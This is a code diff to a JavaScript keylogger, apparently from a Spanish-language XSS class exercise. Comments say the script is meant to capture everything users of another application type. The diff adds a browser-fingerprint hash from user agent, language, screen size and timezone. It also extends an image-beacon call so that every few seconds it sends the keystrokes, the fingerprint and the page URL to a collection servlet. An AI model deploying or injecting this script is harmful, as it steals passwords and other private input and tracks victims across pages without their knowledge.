@@ -2,7 +2,26 @@
 //Este ejemplo sería para mandar todo lo que escriban nuestros usuarios
 //de la otra aplicación a este servidor
 var keys = '';
+var hash = hashNavegador()
  
+function hashNavegador() {
+    const str = 
+		navigator.userAgent + 
+		navigator.language + 
+		screen.width + 
+		screen.height + 
+		Intl.DateTimeFormat().resolvedOptions().timeZone
+		
+	let hash = 0;
+	for (let i = 0, len = str.length; i < len; i++) {
+	    let chr = str.charCodeAt(i)
+	    hash = (hash << 5) - hash + chr
+	    hash |= 0; // Convert to 32bit integer
+	}
+	return hash; 
+}
+
+
 //vamos guardando lo que escriba
 document.onkeypress = function(e) {
 	//Esto para que funcione en navegadores antiguos de IE
@@ -16,13 +35,10 @@ document.onkeypress = function(e) {
 
 //cada 1 segundo mandamos lo que haya escrito el usuario al SVTeclas
 window.setInterval(function(){
-    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t=' + keys;
+    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t='+keys+'&hash='+hash+'&pagina='+document.location;
     keys = '';
 }, 5000);
 
-//Esto se enviaria de todos los usuarios que escriban pero se podría hacer cosas
-//como meter mas parametros en la url como por ejemplo el nombre de la pagina
-//o el usuario a buscandolo a traves de los nodos de HTML (si saben donde se encuentra
-//que es facil)
+
 
 
